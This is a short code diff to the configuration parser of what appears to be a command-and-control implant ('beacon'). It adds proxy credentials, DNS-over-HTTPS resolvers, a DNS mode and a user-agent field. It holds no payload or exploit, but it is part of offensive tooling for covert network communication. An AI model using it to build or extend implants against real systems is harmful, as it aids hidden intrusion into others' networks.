@@ -49,6 +49,12 @@ AgentConfig::AgentConfig()
 	this->profile.ans_pre_size = packer->Unpack32();
 	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;
 
+	this->profile.proxy_type     = (BYTE) packer->Unpack32();
+	this->profile.proxy_host     = packer->UnpackBytesCopy(&length);
+	this->profile.proxy_port     = (WORD) packer->Unpack32();
+	this->profile.proxy_username = packer->UnpackBytesCopy(&length);
+	this->profile.proxy_password = packer->UnpackBytesCopy(&length);
+
 	this->listener_type = 0;
 
 	this->kill_date    = packer->Unpack32();
@@ -76,6 +82,7 @@ AgentConfig::AgentConfig()
 #elif defined(BEACON_DNS)
 	this->profile.domain        = packer->UnpackBytesCopy(&length);
 	this->profile.resolvers     = packer->UnpackBytesCopy(&length);
+	this->profile.doh_resolvers = packer->UnpackBytesCopy(&length);
 	this->profile.qtype         = packer->UnpackBytesCopy(&length);
 	this->profile.pkt_size      = packer->Unpack32();
 	this->profile.label_size    = packer->Unpack32();
@@ -84,6 +91,8 @@ AgentConfig::AgentConfig()
 	this->profile.burst_enabled = packer->Unpack32();
 	this->profile.burst_sleep   = packer->Unpack32();
 	this->profile.burst_jitter  = packer->Unpack32();
+	this->profile.dns_mode      = packer->Unpack32();
+	this->profile.user_agent    = packer->UnpackBytesCopy(&length);
 
 	this->listener_type = packer->Unpack32();
 	this->kill_date     = packer->Unpack32();
